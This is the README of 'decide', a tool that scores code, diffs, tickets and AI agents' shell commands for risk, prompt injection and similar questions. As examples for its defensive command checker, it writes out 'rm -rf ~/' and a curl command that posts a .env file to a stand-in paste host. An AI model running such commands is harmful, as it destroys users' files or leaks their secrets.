# decide

[![Reference](https://img.shields.io/badge/reference-pkg.go.dev-00ADD8?style=flat-square&logo=go&logoColor=white&labelColor=2f363d)](https://pkg.go.dev/github.com/deepnoodle-ai/decide)
[![Tests](https://img.shields.io/github/actions/workflow/status/deepnoodle-ai/decide/ci.yml?branch=main&style=flat-square&label=tests&labelColor=2f363d&color=00ADD8)](https://github.com/deepnoodle-ai/decide/actions/workflows/ci.yml)
[![Release](https://img.shields.io/github/v/release/deepnoodle-ai/decide?style=flat-square&label=release&labelColor=2f363d&color=00ADD8)](https://github.com/deepnoodle-ai/decide/releases)

**Judgment calls, at scale.** Ask a question about every function,
ticket, or diff, and get an answer with a probability.

```sh
git diff main | decide run code-risk --fail-on flagged   # gate the merge
echo "$CMD" | decide run command-risk --fail-on flagged  # check an agent's command
decide run ticket-routing tickets.jsonl --field body     # route the queue
decide run security src                                  # rank a codebase
```

Run it from your shell, in CI, or from
[Claude Code](#audit-a-whole-codebase-from-claude-code).

[![decide passes ls -la src, flags git push --force origin main as destructive, and flags curl -d @.env paste.example.com as a leak](https://files.deepnoodle.ai/decide/site/landing-8048b29e5adf.gif)](https://decide.deepnoodle.ai)

## Why not just call an LLM?

A decision model doesn't write anything. It answers yes or no, picks an
option, or gives a score, with a probability attached. For writing or
reasoning, use an LLM. For a judgment on every item, a decision model is
the better tool:

- **Faster.** An LLM writes its reply a token at a time. A decision
  model returns one answer.
- **Cheaper.** With an LLM you pay for every token it writes back. Here
  you pay for the prompt: $0.042 per million input tokens on
  [Jev](https://docs.typesafe.ai/models), with no output tokens.
- **Calibrated.** Ask an LLM how sure it is and it types a confident
  number. A decision model is trained so that 90% means right about nine
  times in ten.

## Install

```sh
brew install deepnoodle-ai/tap/decide
```

Or grab a binary from the
[releases](https://github.com/deepnoodle-ai/decide/releases), or build it
with Go 1.27 or later:

```sh
go install github.com/deepnoodle-ai/decide/cmd/decide@latest
```

Run `decide` on its own for a tour.

## Try it

Get a key from [typesafe.ai](https://typesafe.ai) and ask about a
command you'd rather not run:

```sh
export TYPESAFE_API_KEY=...

echo 'rm -rf ~/' | decide run command-risk
```

```
Running command-risk on 1 line · typesafe jev-latest

stdin:1  rm -rf ~/
! destructive  yes     98%
  leak         no      89%
  publish      no      74%
! severe       yes     98%

✓ 1 answered  ! 1 flagged  200ms
Flagged: stdin:1
See these results again with: decide runs view 20261008-040438-f7af
```

Four answers, four probabilities, nothing to parse. Add
`--fail-on flagged` and decide exits with code 2 when anything is
flagged. That's all a git hook or a CI job needs to stop. Every
probability is in `--json` too, so a script can act on the sure answers
and send the close calls to a person.

The [quickstart](https://decide.deepnoodle.ai/start/) goes further, and
the [recipes](https://decide.deepnoodle.ai/recipes/) cover CI and git
hooks.

## Audit a whole codebase from Claude Code

```text
/plugin marketplace add deepnoodle-ai/decide
/plugin install decide@decide
```

`/decide:audit` ranks every function in a repository for security bugs,
and Claude reads only the few at the top. `/decide:hunt` takes a bug fix
and finds where the same mistake lives elsewhere.

The plugin also gives Claude a second opinion at the moments its own
judgment is most likely to slip. When Claude fetches a page or reads a
tool result, decide checks it for prompt injection first. When Claude
Code would run a shell command without asking anyone, as in bypass mode,
decide checks it first. Claude also gets a judge tool for its own questions. See the
[Claude Code guide](https://decide.deepnoodle.ai/reference/claude-code/)
and [plugin/README.md](plugin/README.md).

## Reads text, code, images, audio, video, and PDFs

Point decide at a file, a folder, a diff, or standard input. It splits
what it finds into items and asks about each one on its own:

- **Text and Markdown**, by line, section, or file.
- **Source code** in Go, Python, JavaScript, TypeScript, and Java, by
  function, each sent with its imports. On a diff, only the functions
  that changed.
- **JSON, JSONL, and CSV**, by record, with `--field` to pick the text.
- **Images, audio, video, and PDFs**, one item per file, with any
  template. A screenshot of a diff works with `code-risk` just fine.

Long items are judged in parts. Every answer is cached in
`~/.decide/cache`, so running again over a codebase asks only about what
changed:

```
81974 answers from cache · 450 asked
```

Results print as text, JSON, CSV, a Markdown report, or GitHub Actions
annotations on a pull request. See
[items](https://decide.deepnoodle.ai/reference/items/) and
[output](https://decide.deepnoodle.ai/reference/output/).

## Twelve templates, built in

A template is a set of questions in a few lines of JSON. The built-in
ones come with tuned wording and flag thresholds, so you don't have to
work out what "risky" means before lunch.

| Template | Asks |
| --- | --- |
| `sentiment` | Positive, negative, or neutral? |
| `triage` | Is this support request urgent? How bad is the impact? |
| `ticket-routing` | Billing, engineering, or other? |
| `relevance` | Does this answer a question you choose? |
| `code-risk` | Could this code cause security or data problems? |
| `security` | Can untrusted input reach a query, a command, a URL, or a page? |
| `prompt-injection` | Is this text trying to hijack an AI agent? |
| `task-readiness` | Is this issue ready for a coding agent? How big is it? |
| `pr-description` | Does this pull request's description meet your guidelines? |
| `command-risk` | Could this shell command destroy work or leak secrets? |
| `receipt-quality` | Is this a readable receipt? (image) |
| `invoice-check` | Is this a complete, paid invoice? (PDF, Gemini only) |

Need a different question? `decide templates new NAME --from TEMPLATE`
copies a template for you to edit. See
[templates](https://decide.deepnoodle.ai/reference/templates/). Want to
watch them catch something? The [demo](demo/README.md) is a small
repository with planted problems.

## Four decision models, one set of commands

Jev is the default. Switch with `--provider cloudflare`, `openai`, or
`gemini`, or set `DECIDE_PROVIDER` once. The commands and templates
stay the same.

| Provider | Model | Reads |
| --- | --- | --- |
| [Jev](https://docs.typesafe.ai/introduction) by TypeSafe | `jev-latest` | text |
| [Clef](https://developers.cloudflare.com/workers-ai/models/clef/) by Cloudflare | `clef`, `clef-flash` | text, images |
| [GPT-6 Luna](https://developers.openai.com/api/docs/guides/decisions) by OpenAI | `gpt-6-luna` | text, images |
| [Gemini Decision](https://aistudio.google.com/docs/decisions-api) by Google | `gemini-decision-1` | text, images, audio, video, PDFs |

The [providers page](https://decide.deepnoodle.ai/reference/providers/)
lists keys, file formats, and size limits, and shows how to point
decide at a Jev-compatible service you host yourself.

## Learn more

The docs at [decide.deepnoodle.ai](https://decide.deepnoodle.ai) have the
[quickstart](https://decide.deepnoodle.ai/start/),
[tutorials](https://decide.deepnoodle.ai/tutorials/check-agent-commands/),
[recipes](https://decide.deepnoodle.ai/recipes/), a
[Go guide](https://decide.deepnoodle.ai/start/go/), and a
[guide for agents](https://decide.deepnoodle.ai/reference/agents/).

## Contributing

Issues and pull requests are welcome. Read [CONTRIBUTING.md](CONTRIBUTING.md)
first, and report security issues as described in [SECURITY.md](SECURITY.md).
Before v1, the library API and the CLI may change in any release.

## License

[Apache 2.0](LICENSE)
